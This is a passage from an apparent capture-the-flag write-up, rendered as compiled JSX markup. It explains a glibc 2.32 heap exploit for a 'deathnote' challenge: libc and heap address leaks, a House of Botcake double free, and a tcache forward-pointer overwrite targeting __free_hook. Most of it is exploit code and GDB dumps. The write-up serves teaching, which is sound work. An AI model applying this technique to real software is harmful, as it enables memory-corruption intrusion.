number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1c5220\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Libc base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"That\\u2019s great! Let\\u2019s move on the next stage: Leak heap address!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-2-leak-heap-address\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-2-leak-heap-address\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 2: Leak heap address\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"To leak heap address, we just simply create 1 small chunk then free it. Remember what I have explained? The forward pointer has to XOR first, then it will be written to chunk. So just \",(0,n.jsx)(e.code,{children:\"free()\"}),\" 1 small chunk and we can get the address of forward pointer, then recover the base address of heap:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`fw_pointer = u64(show(0).ljust(8, b'\\\\x00'))\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`log.success(\"Leak fw pointer: \" + hex(fw_pointer))\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And we can see that the forward pointer was leaked:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/fw_pointer_leaked.png\",alt:\"fw_pointer_leaked.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Check with GDB:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/check_fw_pointer.png\",alt:\"check_fw_pointer.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"So as I mentioned above, with the first chunk is freed and goes to tcache, the forward pointer will be like this:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`# (\u003cCurrent chunk address\u003e \u003e\u003e 12) ^ \u003cPrevious chunk address\u003e = \u003cprotected forward pointer\u003e\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  (       0x1a1c2a0        \u003e\u003e 12) ^             0            = 0x1a1c\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"So to recover the heap base address, we just simply do the reverse order (don\\u2019t need to XOR) with the following payload:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Heap base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And we get the heap base address. Before we move on next stage, just \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\" again to reset the state of tcache bin to null:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"And now, let\\u2019s move on!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-3-overwrite-forward-pointer\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-3-overwrite-forward-pointer\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 3: Overwrite forward pointer\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"For this stage, we will use the technique called \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.32/house_of_botcake.c\",children:\"House of Botcake\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"We will first \",(0,n.jsx)(e.code,{children:\"malloc\"}),\" 7 chunks with the size larger than fastbin but still smaller than tcache and the ideal size if 0x100:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Next, we will create 2 chunks with the same size as 0x100, the first one will be used for controlling (overwrite forward pointer) and the second one for attacking tcache:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And 1 small chunk to avoid consolidation:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsx)(e.code,{className:\"language-py code-highlight\",children:(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,n.jsx)(e.p,{children:\"Next, we will free all 7 chunks at the beginning of this stage to fill up the tcache:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And with the next free() the chunk with the same size as 0x100, because tcache is full so it will not be added to tcache but will put it to fastbin (if within size range of fastbin) or unsorted bin (in this case is unsorted bin because 0x100 is larger than fastbin)\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/unsorted_bin_after_7_free.png\",alt:\"unsorted_bin_after_7_free.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So as the technique describe, we still have 2 chunk (index 7 and 8) haven\\u2019t freed yet. We will free the chunk which is below the other first (this case is chunk index 8 because it was \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\" later), then we free the chunk above that freed chunk to make consolidation between 2 chunk:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"After that, we will malloc 1 chunk with the same size of 0x100 to take 1 address out from tcache, and we free that chunk index 8 to put it to tcache and we successfully conducted a double free:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'testtest'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"I malloc with index 20 to not remove the pointer of index 8. After this, let\\u2019s check GDB. We can see that tcache is full of 7 chunk:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/tcache.png\",alt:\"tcache.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And unsorted bin contain a freed chunk:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/unsorted_bin.png\",alt:\"unsorted_bin.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Check the unsorted bin and we can see this:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/50xg 0x1604a20\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a20:  0x0000000000000000  0x0000000000000221\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a30:  0x0000000001604c60  0x00007f2a65850c00    \u003c-- Unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a40:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a50:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a60:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a70:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a80:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604a90:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604aa0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ab0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ac0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ad0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ae0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604af0:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b00:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b10:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b20:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b30:  0x0000000000000000  0x0000000000000111\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b40:  0x0000000001605e14  0x0000000001604010    \u003c-- Tcache\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b50:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b60:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b70:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b80:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604b90:  0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x1604ba0:  0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The unsorted bin size is 0x210 so that we can malloc a chunk larger than 0x100 to change the forward pointer in tcache chunk. But first, we need to take the offset between heap base address and that tcache chunk address \",(0,n.jsx)(e.code,{children:\"0x1604b40\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  vmmap\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`[ Legend:  Code | Heap | Stack ]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`Start              End                Offset             Perm Path\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x0000000001604000 0x0000000001625000 0x0000000000000000 rw- [heap]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f2a6568a000 0x00007f2a6568c000 0x0000000000000000 rw-\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0x00007f2a6568c000 0x00007f2a656b2000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`...\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  p/x  0x1604b40- 0x0000000001604000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`$1 = 0xb40\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So we know the offset. Remember the new mechanism for the forward pointer and we can fake the forward pointer to malloc \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" with the payload below:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:'# The chunk we overwrite forward pointer has address at \"heap + 0xb40\"'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"fake_fw_pointer \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xb40\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'__free_hook'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So that we fake the previous chunk into \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" and write it with the chunk from unsorted bin. We will \",(0,n.jsx)(e.code,{children:\"malloc\"}),\" a chunk with size of 0x130 for overwriting:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),\"                 \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Padding to tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x111\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Prev_size and size of tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"payload \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" flat\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"fake_fw_pointer\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Overwrite forward pointer\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x130\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And let\\u2019s check if our forward pointer is correct or not (Address changed):\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/50xg 0x0000000000caca20\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca20:   0x0000000000000000  0x0000000000000141\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca30:   0x00007f43934d0e10  0x00007f43934d0e10    \u003c-- New chunk from unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca40:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca60:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca70:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaa0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacab0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacac0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacad0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacae0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaf0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb00:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb10:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb20:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb30:   0x0000000000000000  